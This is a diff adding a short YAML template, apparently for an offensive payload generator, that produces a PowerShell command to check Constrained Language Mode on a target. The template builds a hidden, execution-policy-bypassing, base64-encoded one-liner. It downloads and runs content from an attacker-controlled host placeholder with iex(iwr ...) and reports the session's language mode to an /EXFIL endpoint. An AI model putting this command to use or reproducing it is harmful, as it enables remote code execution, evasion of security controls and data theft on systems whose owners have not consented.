@@ -1,0 +1,11 @@
+description: "Powershell command for enumerating CLM"
+variables:
+  port: 80
+templates:
+  powershell:
+    variables:
+      command: "iex(iwr -UseBasicParsing \"http://{{LHOST}}:{{LPORT}}/EXFIL?CLM=$($ExecutionContext.SessionState.LanguageMode)\")"
+    template: powershell.exe -ep bypass -Sta -Nop -Window Hidden -e {{ Encoder.base64(command,Encoder.utf16le) }}
+print:
+- "Powershell command for enumerating CLM:"
+- "{{Templates.get('powershell')}}"
